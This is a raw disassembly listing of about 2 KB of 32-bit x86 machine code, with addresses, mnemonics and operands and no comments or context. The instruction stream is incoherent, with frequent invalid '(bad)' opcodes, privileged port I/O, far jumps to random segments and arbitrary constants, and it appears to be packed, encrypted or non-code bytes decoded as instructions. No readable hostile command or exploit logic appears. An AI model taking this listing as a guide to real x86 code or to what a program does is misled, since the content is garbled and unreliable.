  411522:	retf   
  411523:	popa   
  411524:	or     DWORD PTR [edx-0x56],0x61d5fbcb
  41152b:	xor    edi,DWORD PTR ds:0x882ed700
  411531:	es cwde 
  411533:	jnp    0x41151c
  411535:	and    eax,ecx
  411537:	mov    eax,ds:0xb3f62e7c
  41153c:	(bad)  
  41153d:	stos   DWORD PTR es:[edi],eax
  41153e:	fistp  QWORD PTR [edx-0x78d13ace]
  411544:	or     DWORD PTR [ecx],ebx
  411546:	xchg   ebp,eax
  411547:	add    al,0xcc
  411549:	retf   0xd70a
  41154c:	pop    esp
  41154d:	xchg   esp,eax
  41154e:	lds    edx,FWORD PTR ds:0xa95335f4
  411554:	and    al,0xd4
  411556:	out    0xed,eax
  411558:	mov    bl,0x52
  41155a:	pop    ecx
  41155b:	sbb    al,0x26
  41155d:	stos   BYTE PTR es:[edi],al
  41155e:	pop    es
  41155f:	ins    DWORD PTR es:[edi],dx
  411560:	pushf  
  411561:	and    eax,0x8f861080
  411566:	dec    ecx
  411567:	xchg   DWORD PTR [edi-0x4ec90755],ebx
  41156d:	test   DWORD PTR [eax],ebp
  41156f:	add    ch,ch
  411571:	(bad)  
  411572:	sti    
  411573:	mov    al,ds:0x4a0b408e
  411578:	mov    BYTE PTR [ecx+0x7e],dl
  41157b:	into   
  41157c:	cs dec edx
  41157e:	adc    al,0x93
  411580:	stos   DWORD PTR es:[edi],eax
  411581:	adc    bl,dh
  411583:	jno    0x41156a
  411585:	(bad)  
  411586:	adc    edx,eax
  411588:	jno    0x4115f5
  41158a:	jl     0x41151a
  41158c:	mov    esi,0xb72f1463
  411591:	xchg   ebx,eax
  411592:	in     al,dx
  411593:	cmp    eax,0xa72ff89d
  411598:	cli    
  411599:	sub    esp,ebx
  41159b:	jo     0x41152b
  41159d:	(bad)  
  41159e:	jg     0x4115b1
  4115a0:	pop    ebp
  4115a1:	shl    DWORD PTR [eax-0x15],1
  4115a4:	loop   0x411591
  4115a6:	mov    dl,0xe9
  4115a8:	inc    eax
  4115a9:	xlat   BYTE PTR cs:[ebx]
  4115ab:	dec    ecx
  4115ac:	inc    eax
  4115ad:	bound  sp,DWORD PTR [eax]
  4115b0:	and    al,0x75
  4115b2:	xor    BYTE PTR [eax+0x5],bh
  4115b5:	gs push 0xb37d3320
  4115bb:	(bad)  
  4115bc:	sbb    al,BYTE PTR [eax+0x681664a4]
  4115c2:	push   ds
  4115c3:	dec    ebx
  4115c4:	das    
  4115c5:	dec    ebx
  4115c6:	push   ss
  4115c7:	fsubr  DWORD PTR [eax+0x36f550c2]
  4115cd:	call   0x4b59c8fc
  4115d2:	sbb    al,BYTE PTR [ebp+edx*8-0x5b]
  4115d6:	lahf   
  4115d7:	pop    ecx
  4115d8:	out    0x47,eax
  4115da:	ss push ss
  4115dc:	dec    edi
  4115dd:	addr16 adc al,0xf
  4115e0:	xchg   ebx,eax
  4115e1:	adc    edx,esp
  4115e3:	sub    esp,DWORD PTR [ecx+0x1]
  4115e6:	xor    BYTE PTR [ebx+0x9867748],0xaa
  4115ed:	popf   
  4115ee:	cmp    dl,BYTE PTR [edi]
  4115f0:	repz aaa 
  4115f2:	(bad)  
  4115f3:	bnd jbe 0x41160d
  4115f6:	shr    BYTE PTR [edi+0x5c65e7b8],cl
  4115fc:	iret   
  4115fd:	lods   eax,DWORD PTR ds:[esi]
  4115fe:	hlt    
  4115ff:	mov    ecx,0x7091cd3f
  411604:	adc    edx,DWORD PTR [esi]
  411606:	and    edx,DWORD PTR [esi]
  411608:	or     ecx,eax
  41160a:	daa    
  41160b:	js     0x4115f7
  41160d:	xchg   esi,eax
  41160e:	repz adc bl,bl
  411611:	push   ecx
  411612:	imul   ecx,DWORD PTR [ebp+ebp*1-0x69],0xffffffc7
  411617:	mov    BYTE PTR [eax-0x46df2491],0x5d
  41161e:	or     BYTE PTR [eax],bl
  411620:	test   BYTE PTR [esp+ebp*4+0x1f031ace],ch
  411627:	and    DWORD PTR ds:0x4337fb12,edi
  41162d:	ss jp  0x4115da
  411630:	push   edi
  411631:	in     al,dx
  411632:	adc    al,0x7f
  411634:	xchg   ebp,eax
  411635:	and    DWORD PTR [ecx-0x9],0xfffffff2
  411639:	ror    BYTE PTR [edi+0x50],0xeb
  41163d:	bound  eax,QWORD PTR [edi]
  41163f:	iret   
  411640:	adc    dh,BYTE PTR [esi]
  411642:	push   es
  411643:	pusha  
  411644:	loopne 0x41167e
  411646:	pop    ss
  411647:	mov    dl,0xfc
  411649:	sbb    DWORD PTR [eax+0x5d],esp
  41164c:	sbb    DWORD PTR [edi-0x7f4833a7],esp
  411652:	call   0x9be7:0x7a201a88
  411659:	into   
  41165a:	add    DWORD PTR [eax],edx
  41165c:	aas    
  41165d:	(bad)  
  41165e:	sub    edx,ebx
  411660:	pop    DWORD PTR [ebx-0x45a3c709]
  411666:	rcr    bh,cl
  411668:	imul   ebp,DWORD PTR [ebx+0x54f142b2],0x2e
  41166f:	mov    ch,0xee
  411671:	pop    ecx
  411672:	(bad)  
  411673:	xchg   ebx,eax
  411674:	push   0xffffff88
  411676:	and    DWORD PTR [edi-0x77d9535e],ebp
  41167c:	ret    
  41167d:	pusha  
  41167e:	inc    esp
  41167f:	iret   
  411680:	fild   WORD PTR [eax-0x112aad22]
  411686:	ror    esi,1
  411688:	out    0xc6,al
  41168a:	dec    ecx
  41168b:	sub    al,0xd5
  41168d:	es push 0x96a85809
  411693:	loope  0x4116f5
  411695:	rcr    edi,cl
  411697:	dec    edi
  411698:	(bad)  
  411699:	test   al,0x49
  41169b:	into   
  41169c:	iret   
  41169d:	mov    cl,BYTE PTR [esi]
  41169f:	mov    bl,0x87
  4116a1:	fsubr  QWORD PTR [eax+0x3cd35bf]
  4116a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116a8:	outs   dx,DWORD PTR ds:[esi]
  4116a9:	mov    BYTE PTR [eax],al
  4116ab:	cli    
  4116ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ae:	ins    DWORD PTR es:[edi],dx
  4116af:	push   esi
  4116b0:	imul   esi,DWORD PTR [esp+edi*2],0xdf4eee73
  4116b7:	fidivr DWORD PTR [esi-0x41]
  4116ba:	sar    DWORD PTR [ebx],cl
  4116bc:	jl     0x411692
  4116be:	push   0x8d8f502
  4116c3:	imul   eax,DWORD PTR [eax+ebp*2],0x2e
  4116c7:	jecxz  0x411737
  4116c9:	dec    eax
  4116ca:	pop    eax
  4116cb:	fs scas al,BYTE PTR es:[edi]
  4116cd:	sub    al,0xdf
  4116cf:	mov    BYTE PTR [ecx+0x581c9bd0],cl
  4116d5:	pop    edi
  4116d6:	pop    eax
  4116d7:	and    ah,ch
  4116d9:	std    
  4116da:	sahf   
  4116db:	icebp  
  4116dc:	iret   
  4116dd:	xor    DWORD PTR [ebp+edi*8+0x3a6e191],esi
  4116e4:	pop    eax
  4116e5:	jl     0x41174a
  4116e7:	(bad)  
  4116e8:	mov    ah,0x6b
  4116ea:	cwde   
  4116eb:	pop    esp
  4116ec:	sbb    cl,dh
  4116ee:	rol    BYTE PTR [edi+0x21],1
  4116f1:	mov    dl,0xed
  4116f3:	loope  0x41175a
  4116f5:	pop    eax
  4116f6:	add    al,0x1e
  4116f8:	add    ebp,ebx
  4116fa:	arpl   WORD PTR [edi+0x3e],sp
  4116fd:	(bad)  
  4116fe:	out    dx,al
  4116ff:	int    0x86
  411701:	xchg   sp,ax
  411703:	es in  eax,dx
  411705:	jmp    0x742c:0x819d57af
  41170c:	cmp    DWORD PTR [esi],esp
  41170e:	fwait
  41170f:	in     al,dx
  411710:	adc    al,0x27
  411712:	jb     0x4116c7
  411714:	pop    eax
  411715:	push   esp
  411716:	and    eax,0x7d79d11f
  41171b:	test   BYTE PTR [ecx-0x558227d0],bh
  411721:	(bad)  
  411722:	in     eax,0x6f
  411724:	push   edx
  411725:	(bad)  
  411727:	pop    ss
  411728:	lahf   
  411729:	mov    bh,BYTE PTR [ebp+eax*8+0x3dca17d8]
  411730:	shl    DWORD PTR [ecx+0x712765e2],1
  411736:	inc    eax
  411737:	push   esi
  411738:	(bad)  
  411739:	iret   
  41173a:	xor    esi,DWORD PTR [eax+eiz*8-0x67]
  41173e:	sub    al,0xcf
  411740:	ret    0x9745
  411743:	shr    DWORD PTR [di-0x136a],cl
  411748:	sar    DWORD PTR [ecx+edx*2+0x7a7f3460],cl
  41174f:	mov    ebp,0xeb64f9a3
  411754:	sub    ebp,DWORD PTR [eax-0x34]
  411757:	enter  0x976f,0xf4
  41175b:	dec    eax
  41175c:	icebp  
  41175d:	jecxz  0x411713
  41175f:	pop    ds
  411760:	mov    bh,0xa8
  411762:	dec    edx
  411763:	sahf   
  411764:	in     eax,0x11
  411766:	adc    ecx,DWORD PTR [eax+0x52]
  411769:	call   0xc771:0x2ac9e46
  411770:	jne    0x411797
  411772:	inc    ecx
  411773:	leave  
  411774:	icebp  
  411775:	out    dx,eax
  411776:	sub    bh,BYTE PTR [ebx]
  411778:	or     eax,0xa10fc9ed
  41177d:	sub    cl,cl
  41177f:	out    0xb6,eax
  411781:	les    edx,FWORD PTR fs:[ebx+ebx*2+0x1d]
  411786:	gs dec esp
  411788:	(bad)  
  411789:	imul   eax,DWORD PTR [ecx+0x1fa8cddb],0x1a472994
  411793:	ins    BYTE PTR es:[edi],dx
  411794:	repz and eax,0x215c4225
  41179a:	xchg   esp,eax
  41179b:	div    BYTE PTR [ebx]
  41179d:	ret    0x1cb9
  4117a0:	mov    edi,0xa46c6d56
  4117a5:	sbb    DWORD PTR [ecx],0xb
  4117a8:	(bad)  
  4117a9:	dec    esp
  4117aa:	push   edi
  4117ab:	cmp    BYTE PTR [ecx-0x4f],bl
  4117ae:	cdq    
  4117af:	xor    eax,0x747e782e
  4117b4:	mov    edx,0x6634cffd
  4117b9:	jno    0x411764
  4117bb:	mov    ebx,0x44135f8b
  4117c0:	pop    ss
  4117c1:	fwait
  4117c2:	xor    eax,0xf609ea94
  4117c7:	cs adc al,0x30
  4117ca:	scas   al,BYTE PTR es:[edi]
  4117cb:	daa    
  4117cc:	ins    BYTE PTR es:[edi],dx
  4117cd:	push   esp
  4117ce:	retf   
  4117cf:	push   eax
  4117d0:	mov    eax,0x7841bf50
  4117d5:	inc    edx
  4117d6:	push   esi
  4117d7:	je     0x411856
  4117d9:	stc    
  4117da:	jge    0x4117d7
  4117dc:	pop    edi
  4117dd:	ja     0x411821
  4117df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e0:	ss in  eax,0x68
  4117e3:	pop    edi
  4117e4:	aad    0x86
  4117e6:	fs adc BYTE PTR ss:[edx+0x17],0x61
  4117ec:	int    0x6d
  4117ee:	xchg   esi,eax
  4117ef:	cmp    BYTE PTR [esi+0x3cf75e49],bh
  4117f5:	and    BYTE PTR [ecx-0x18],ch
  4117f8:	pop    ebp
  4117f9:	xor    ch,al
  4117fb:	xor    BYTE PTR [edi-0x75ae0b13],0xa3
  411802:	jecxz  0x411850
  411804:	fst    QWORD PTR [ebp-0x33]
  411807:	push   edx
  411808:	push   edx
  411809:	cld    
  41180a:	jl     0x4117ef
  41180c:	pop    ebx
  41180d:	pop    ss
  41180e:	xor    bl,BYTE PTR [eax]
  411810:	scas   ax,WORD PTR es:[edi]
  411812:	sti    
  411813:	bound  esi,QWORD PTR [ebx+eax*4]
  411816:	adc    ebp,DWORD PTR [ecx+0x23ba74ed]
  41181c:	pop    ecx
  41181d:	xchg   edx,eax
  41181e:	mov    bh,0x70
  411820:	in     eax,0x3a
  411822:	cmp    ch,BYTE PTR [eax-0x6eb89459]
  411828:	dec    edx
  411829:	sbb    cl,BYTE PTR [ebx]
  41182b:	push   edx
  41182c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41182d:	mov    dh,0x1f
  41182f:	pop    ss
  411830:	cmp    eax,0x9b028e32
  411835:	imul   ebp
  411837:	in     eax,0xc1
  411839:	pop    eax
  41183a:	xchg   esi,eax
  41183c:	retf   0x4abd
  41183f:	pop    es
  411840:	jmp    0x45b4:0x74540771
  411847:	ins    BYTE PTR es:[edi],dx
  411848:	ret    0x65d5
  41184b:	clc    
  41184c:	fs cs (bad) 
  41184f:	xor    eax,0xfb25c558
  411854:	add    ebx,DWORD PTR [edi+0x5c3a7c72]
  41185a:	dec    ebp
  41185b:	xchg   esp,eax
  41185c:	cmp    ebx,esi
  41185e:	mov    al,ds:0x5c3e6f5e
  411863:	or     al,0x78
  411865:	mov    bh,0x36
  411867:	repnz ins DWORD PTR es:[edi],dx
  411869:	dec    eax
  41186a:	repnz in eax,0x69
  41186d:	xchg   ecx,eax
  41186e:	imul   ecx,DWORD PTR [ecx+0x2436c306],0x6
  411875:	mov    edx,0xe63a6221
  41187a:	outs   dx,BYTE PTR ds:[esi]
  41187b:	push   es
  41187c:	retf   
  41187d:	aaa    
  41187e:	push   edx
  41187f:	sar    DWORD PTR [esi+0x46e86ce2],cl
  411885:	sbb    eax,0x68888a13
  41188a:	mov    ds:0xcbc70ca8,al
  41188f:	xchg   BYTE PTR [esi],dh
  411891:	sub    al,0x1c
  411893:	xor    bl,bl
  411895:	loopne 0x4118c0
  411897:	aas    
  411898:	jl     0x4118e4
  41189a:	push   esi
  41189b:	xchg   edi,eax
  41189c:	dec    ebx
  41189d:	add    DWORD PTR [ecx],edx
  41189f:	and    edi,DWORD PTR [eax+0x39e80cec]
  4118a5:	mov    WORD PTR [ecx],es
  4118a7:	ss pop edi
  4118a9:	ins    BYTE PTR es:[edi],dx
  4118aa:	lods   eax,DWORD PTR ds:[esi]
  4118ab:	bsf    eax,ebx
  4118ae:	aam    0xdd
  4118b0:	push   edx
  4118b1:	sub    eax,0x7a2b8b09
  4118b6:	cwde   
  4118b7:	data16 fwait
  4118b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118ba:	push   ss
  4118bb:	outs   dx,DWORD PTR ds:[esi]
  4118bc:	mov    cl,0x4c
  4118be:	cmp    edi,DWORD PTR [eax-0x1f]
  4118c1:	fldcw  WORD PTR [edx+0x6]
  4118c4:	sbb    dh,BYTE PTR [edx+0x52f60fdc]
  4118ca:	sub    DWORD PTR [eax+0x308ea79f],ecx
  4118d0:	sahf   
  4118d1:	ins    BYTE PTR es:[edi],dx
  4118d2:	das    
  4118d3:	outs   dx,DWORD PTR ds:[esi]
  4118d4:	jmp    0xe29:0x9ea1b056
  4118db:	sbb    DWORD PTR [ebp+0x25],0xc61b3830
  4118e2:	sbb    BYTE PTR [ebx-0x44],0x5b
  4118e6:	rol    DWORD PTR [ecx+0x7],1
  4118e9:	mov    ecx,0xcd145884
  4118ee:	dec    esp
  4118ef:	neg    DWORD PTR [ecx-0x43]
  4118f2:	daa    
  4118f3:	out    dx,eax
  4118f4:	jno    0x411916
  4118f6:	fs (bad) 
  4118f8:	in     al,0xe9
  4118fa:	push   ebx
  4118fb:	ss jb  0x41194b
  4118fe:	xchg   ebp,eax
  4118ff:	or     BYTE PTR [esi],ah
  411901:	inc    edi
  411902:	dec    edx
  411903:	mov    esi,0xd9309006
  411908:	aam    0xee
  41190a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41190b:	mov    eax,ds:0x8384bffc
  411910:	(bad)  
  411912:	bound  edi,QWORD PTR [edi+0x1d8a194f]
  411918:	mov    eax,DWORD PTR ss:[ebx]
  41191b:	jmp    0x411952
  41191d:	sahf   
  41191e:	and    al,0x70
  411920:	cmp    eax,0x1bf5c4f4
  411925:	or     eax,0x5ee2e762
  41192a:	push   ecx
  41192b:	scas   al,BYTE PTR es:[edi]
  41192c:	(bad)  
  41192d:	int3   
  41192e:	mov    al,ds:0xac185407
  411933:	stos   BYTE PTR es:[edi],al
  411934:	push   edi
  411935:	js     0x41198d
  411937:	pusha  
  411938:	test   DWORD PTR [edi-0x6e1dd759],0x1feecb4b
  411942:	rol    DWORD PTR [edx+0x2c27abb4],1
  411948:	mov    bl,0x8d
  41194a:	mov    ch,0x63
  41194c:	push   0xea2fe521
  411951:	dec    edx
  411952:	mov    ds:0x12ad9c7b,eax
  411957:	adc    ecx,DWORD PTR [eax+0x72ade414]
  41195d:	pop    es
  41195e:	mov    ebp,DWORD PTR [edi+0x11b8b887]
  411964:	fwait
  411965:	int3   
  411966:	hlt    
  411967:	fidiv  WORD PTR [esi+0x2c6bd114]
  41196d:	xchg   ebx,eax
  41196e:	mov    edi,DWORD PTR [esi-0x737d3ad7]
  411974:	bound  esp,QWORD PTR [esi+0x16]
  411977:	sub    DWORD PTR [edx-0x6b767b3f],ebp
  41197d:	ret    0xc8ae
  411980:	adc    bh,dh
  411982:	xchg   esi,eax
  411983:	mov    DWORD PTR [esi+0x6c7750b5],ecx
  411989:	and    eax,0x895f42e
  41198e:	mov    ecx,0xa1445316
  411993:	int    0x46
  411995:	push   esi
  411996:	fs adc eax,0x10c2b3a4
  41199c:	in     al,0x24
  41199e:	aam    0xf
  4119a0:	inc    edx
  4119a1:	in     eax,dx
  4119a2:	xlat   BYTE PTR ds:[ebx]
  4119a3:	inc    edx
  4119a4:	lea    esp,[ebx]
  4119a6:	out    dx,al
  4119a7:	pop    edx
  4119a8:	into   
  4119a9:	int    0x91
  4119ab:	popa   
  4119ac:	mov    bh,0x79
  4119ae:	mov    ebx,fs
  4119b0:	call   FWORD PTR [ebp+0x18]
  4119b3:	addr16 push edi
  4119b5:	pop    ds
  4119b6:	or     eax,0x7c4a2670
  4119bb:	dec    ebp
  4119bc:	mov    DWORD PTR [ebx+ebx*1+0x32cfc537],edi
  4119c3:	pop    ss
  4119c4:	jno    0x4119e6
  4119c6:	dec    ebx
  4119c7:	push   0x20
  4119c9:	dec    esi
  4119ca:	enter  0x8951,0x5b
  4119ce:	packsswb mm4,mm4
  4119d1:	enter  0x88db,0x5
  4119d5:	imul   ebp,ebp,0x8f9b19c9
  4119db:	(bad)  
  4119dd:	sbb    dh,bl
  4119df:	stos   DWORD PTR es:[edi],eax
  4119e0:	(bad)  
  4119e1:	lds    ebx,FWORD PTR [ebx-0x2f]
  4119e4:	mov    ch,0x89
  4119e6:	fadd   st(4),st
  4119e8:	xor    al,0x9a
  4119ea:	inc    ecx
  4119eb:	jnp    0x41197e
  4119ed:	pop    edx
  4119ee:	pop    es
  4119ef:	mov    ds:0x558e0ba1,al
  4119f4:	inc    esp
  4119f5:	cmp    DWORD PTR [ecx],esi
  4119f7:	(bad)  
  4119f8:	arpl   WORD PTR [esp+edx*4],sp
  4119fb:	inc    esi
  4119fc:	cmp    al,0x44
  4119fe:	dec    eax
  4119ff:	mov    al,0x17
  411a01:	dec    ebx
  411a02:	xor    BYTE PTR [ebx],0xf2
  411a05:	div    BYTE PTR [eax]
  411a07:	add    al,0xf5
  411a09:	inc    esp
  411a0a:	nop
  411a0b:	push   esi
  411a0c:	mov    eax,ds:0x4c0e7431
  411a11:	ror    DWORD PTR [edi+edx*8],1
  411a14:	pop    esi
  411a15:	xor    al,0xcf
  411a17:	or     DWORD PTR [ebx+0x7b],eax
  411a1a:	adc    al,0xf3
  411a1c:	cmp    al,0x3a
  411a1e:	dec    esi
  411a1f:	mov    eax,0xba35a5f2
  411a24:	pop    ebx
  411a25:	mov    WORD PTR [edi+0x57],ss
  411a28:	dec    edi
  411a29:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  411a2b:	mov    WORD PTR [ebx-0x72],fs
  411a2e:	mov    BYTE PTR [edi],bl
  411a30:	jbe    0x4119d8
  411a32:	or     al,0x6d
  411a34:	pop    edx
  411a35:	jnp    0x411ab4
  411a37:	rcr    ah,0xc2
  411a3a:	jns    0x411a13
  411a3c:	push   esp
  411a3d:	mov    bh,0x20
  411a3f:	int    0xcb
  411a41:	and    eax,0xcd503dce
  411a46:	mov    ch,0x67
  411a48:	leave  
  411a49:	mov    dl,0xed
  411a4b:	lods   al,BYTE PTR ds:[esi]
  411a4c:	aam    0xee
  411a4e:	shl    BYTE PTR [ebp-0x301b61a7],cl
  411a54:	fld    QWORD PTR [edx+eax*1]
  411a57:	push   esi
  411a58:	popf   
  411a59:	and    BYTE PTR [edx+0xb],al
  411a5c:	ss out dx,eax
  411a5e:	in     al,0x6a
  411a60:	mov    dh,0xce
  411a62:	ja     0x411a5a
  411a64:	mov    es,WORD PTR [esi]
  411a66:	xchg   edx,eax
  411a67:	popf   
  411a68:	pop    edx
  411a69:	cli    
  411a6a:	int3   
  411a6b:	or     DWORD PTR [ebx-0x50bf80ec],0x4b
  411a72:	sbb    DWORD PTR [eax+0x3f9f6ac9],eax
  411a78:	push   0xffffffe3
  411a7a:	stos   DWORD PTR es:[edi],eax
  411a7b:	push   cs
  411a7c:	cmc    
  411a7d:	sar    ch,cl
  411a7f:	outs   dx,BYTE PTR ds:[esi]
  411a80:	sub    al,0x8
  411a82:	xor    eax,0x2a5fb755
  411a87:	int    0xaf
  411a89:	mov    bl,0x4e
  411a8b:	mov    DWORD PTR [edx+0x38],ecx
  411a8e:	sbb    eax,0x2781ad62
  411a93:	(bad)  
  411a94:	(bad)  [eax-0x437a010a]
  411a9a:	lahf   
  411a9b:	jg     0x411ae2
  411a9d:	addr16 mov esp,0x311731d3
  411aa3:	popa   
  411aa4:	loope  0x411af4
  411aa6:	pop    es
  411aa7:	add    eax,0x39618467
  411aac:	mov    ss,esi
  411aae:	push   0x63df42c0
  411ab3:	mov    eax,ds:0x7369b54d
  411ab8:	ins    BYTE PTR es:[edi],dx
  411ab9:	mov    ch,0xee
  411abb:	cmp    DWORD PTR [esi+0x6b],edi
  411abe:	mov    bl,0x2b
  411ac0:	outs   dx,DWORD PTR ds:[esi]
  411ac1:	inc    DWORD PTR [edx-0x628a821d]
  411ac7:	pop    edi
  411ac8:	in     eax,dx
  411ac9:	fstp   TBYTE PTR ds:0xc273638
  411acf:	aaa    
  411ad0:	mul    DWORD PTR [esi]
  411ad2:	mov    dh,BYTE PTR [ecx-0x39]
  411ad5:	mov    WORD PTR [edx+0x17a97207],?
  411adb:	push   es
  411adc:	lock das 
  411ade:	push   eax
  411adf:	call   0xcbf8652c
  411ae4:	loopne 0x411b23
  411ae6:	and    DWORD PTR [ebx+0x67dc685b],esp
  411aec:	mov    bl,0xa2
  411aee:	retf   
  411aef:	or     al,0x7c
  411af1:	nop
  411af2:	adc    dl,BYTE PTR [edi*8+0x6948a26d]
  411af9:	xchg   esi,eax
  411afa:	or     bh,bl
  411afc:	xlat   BYTE PTR ds:[ebx]
  411afd:	addr16 xor al,0xe4
  411b00:	fcmovbe st,st(4)
  411b02:	push   edi
  411b03:	rcr    BYTE PTR [ecx+0x7944ee70],1
  411b09:	add    eax,0x65a3fdf1
  411b0e:	into   
  411b0f:	mul    BYTE PTR [edx]
  411b11:	pushf  
  411b12:	test   eax,0xe8ddec9d
  411b17:	and    eax,0xc926d6d8
  411b1c:	push   0xc1b7754
  411b21:	jmp    0xfd6a0229
  411b26:	ins    DWORD PTR es:[edi],dx
  411b27:	xor    esi,DWORD PTR [ebx-0x52165a9d]
  411b2d:	xor    bh,BYTE PTR [eax+0x66]
  411b30:	push   0x79
  411b32:	sub    BYTE PTR [ebx],dl
  411b34:	inc    edi
  411b35:	cmc    
  411b36:	sub    al,0xdc
  411b38:	cld    
  411b39:	sbb    eax,0x6d1196e1
  411b3e:	int3   
  411b3f:	sub    eax,0xa8816cc2
  411b44:	pop    ecx
  411b45:	arpl   WORD PTR [edi+0x1b],cx
  411b48:	int3   
  411b49:	mov    dh,0x8b
  411b4b:	daa    
  411b4c:	pop    ds
  411b4d:	sub    BYTE PTR [eax],ch
  411b4f:	nop
  411b50:	in     al,0xc5
  411b52:	fimul  DWORD PTR [edx]
  411b54:	pushf  
  411b55:	mov    bl,0xf3
  411b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b58:	retf   
  411b59:	add    edi,DWORD PTR [edi+0x3d]
  411b5c:	xchg   ebp,eax
  411b5d:	in     al,0x60
  411b5f:	pop    esi
  411b60:	pusha  
  411b61:	ror    DWORD PTR [eax],0x75
  411b64:	mov    bl,0xc8
  411b66:	dec    edi
  411b67:	enter  0x3fe2,0x6f
  411b6b:	or     dx,WORD PTR [edx+eiz*2-0x70]
  411b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b71:	repz in eax,0x7d
  411b74:	outs   dx,BYTE PTR ds:[esi]
  411b75:	mov    ch,0x7d
  411b77:	sahf   
  411b78:	inc    edi
  411b79:	ds pop ebx
  411b7b:	push   ss
  411b7c:	xchg   edi,eax
  411b7d:	push   ecx
  411b7e:	cli    
  411b7f:	out    0xf7,al
  411b81:	jmp    0x2f634d17
  411b86:	retf   
  411b87:	jl     0x411b49
  411b89:	int3   
  411b8a:	ret    0xe12b
  411b8d:	sbb    eax,0xa099452b
  411b92:	fstp   TBYTE PTR [ecx-0x2493df7c]
  411b98:	and    eax,0xffffff90
  411b9b:	mov    dh,0x5c
  411b9d:	jo     0x411b64
  411b9f:	sahf   
  411ba0:	adc    ah,al
  411ba2:	adc    al,BYTE PTR ds:0x41678a6c
  411ba8:	aad    0x4e
  411baa:	ja     0x411c0b
  411bac:	push   ecx
  411bad:	int3   
  411bae:	xchg   edx,eax
  411baf:	pushf  
  411bb0:	gs aam 0x54
  411bb3:	push   0x8a138518
  411bb8:	jo     0x411b62
  411bba:	push   ebp
  411bbb:	dec    ebx
  411bbc:	popf   
  411bbd:	std    
  411bbe:	test   eax,0xe714cc54
  411bc4:	pusha  
  411bc5:	lahf   
  411bc6:	lods   al,BYTE PTR ds:[esi]
  411bc7:	or     al,0x45
  411bc9:	lahf   
  411bca:	jle    0x411c06
  411bcc:	jmp    DWORD PTR [edx]
  411bce:	jmp    0x29d8:0xac108ef3
  411bd5:	push   esi
  411bd6:	frstor [eax+esi*2]
  411bd9:	aaa    
  411bda:	pop    edx
  411bdb:	(bad)  
  411bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bdd:	mov    edx,0x70054b48
  411be2:	shl    ch,0x41
  411be5:	xor    eax,0xbd9c6866
  411bea:	sub    edx,DWORD PTR [eax]
  411bec:	cmp    ebp,DWORD PTR [edi-0x6e]
  411bef:	outs   dx,DWORD PTR ds:[esi]
  411bf0:	and    edi,DWORD PTR [eax-0x5d579d61]
  411bf6:	add    al,0x26
  411bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bf9:	(bad)  
  411bfa:	xor    ch,al
  411bfc:	xchg   BYTE PTR [ecx],bl
  411bfe:	test   DWORD PTR ds:0xb00854cc,0x39255d30
  411c08:	sub    DWORD PTR [edx-0x32123a32],edi
  411c0e:	sahf   
  411c0f:	jecxz  0x411c14
  411c11:	jmp    0x9d973efe
  411c16:	and    cl,BYTE PTR [ebx]
  411c18:	xlat   BYTE PTR ds:[bx]
  411c1a:	mov    ebp,0xddcbcb34
  411c1f:	push   esp
  411c20:	mov    ebx,0x1eeb9957
  411c25:	sbb    BYTE PTR [ebp+0x34],bh
  411c28:	ss xor al,0x9f
  411c2b:	dec    edx
  411c2c:	std    
  411c2d:	call   0xce42:0xa7f36b24
  411c34:	fidivr WORD PTR [ecx]
  411c36:	mov    WORD PTR [edx-0x5015df95],fs
  411c3c:	xchg   ebp,eax
  411c3d:	test   DWORD PTR [edx+0x1b],esp
  411c40:	push   ebp
  411c41:	data16 cmp BYTE PTR [ebx+ebp*2+0x7be4595],al
  411c49:	aam    0xb2
  411c4b:	sahf   
  411c4c:	push   ebp
  411c4d:	xchg   DWORD PTR [edi+0x42],ebp
  411c50:	xchg   edx,eax
  411c51:	inc    esi
  411c52:	rol    ebx,1
  411c54:	rcr    dh,cl
  411c56:	fcom   QWORD PTR ds:0xd19e45c8
  411c5c:	test   DWORD PTR [bx+di-0x6e],ebp
  411c60:	stos   BYTE PTR es:[edi],al
  411c61:	push   ds
  411c62:	data16 cld 
  411c64:	jno    0x411c90
  411c66:	vunpckhps xmm4,xmm2,XMMWORD PTR [eax+0x1e1ed606]
  411c6e:	add    BYTE PTR [edi+0x5e],dh
  411c71:	push   eax
  411c72:	jnp    0x411c2c
  411c74:	arpl   WORD PTR [ebp*1-0x263781bf],bp
  411c7b:	jl     0x411ca4
  411c7d:	fdiv   st,st(7)
  411c7f:	xchg   DWORD PTR [edi],ecx
  411c81:	jns    0x411cf9
  411c83:	iret   
  411c84:	imul   eax,DWORD PTR [ecx-0x48f65582],0x553fa5f0
  411c8e:	push   edi
  411c8f:	push   es
  411c90:	push   ecx
  411c91:	nop
  411c92:	adc    dh,BYTE PTR [eax-0x19]
  411c95:	xchg   DWORD PTR [ebx-0x55],edi
  411c98:	call   0x3d992752
  411c9d:	pop    es
  411c9e:	shl    ebx,1
  411ca0:	(bad)  
  411ca1:	jmp    0x99ab09f9
  411ca6:	call   0xcc4fd2ff
  411cab:	(bad)  
  411cac:	fwait
  411cad:	scas   eax,DWORD PTR es:[edi]
  411cae:	xor    al,0xe5
  411cb0:	push   es
  411cb1:	clc    
  411cb2:	add    dh,BYTE PTR [edi+edx*8]
  411cb5:	jmp    0xc274:0x8410fa8c
  411cbc:	mov    ah,0xe5
  411cbe:	loop   0x411c4b
  411cc0:	ins    DWORD PTR es:[edi],dx
  411cc1:	or     ebp,DWORD PTR [ecx-0x71]
  411cc4:	mov    edx,0xb8b1238c
  411cc9:	imul   ecx,DWORD PTR [ebx+0x65],0x1c2ba3dd
  411cd0:	adc    BYTE PTR [edx],bh
  411cd2:	mov    edi,0xea4c5132
  411cd7:	fsub   DWORD PTR [ebp-0x63]
  411cda:	ja     0x411ced
  411cdc:	retf   
  411cdd:	in     eax,0x8a
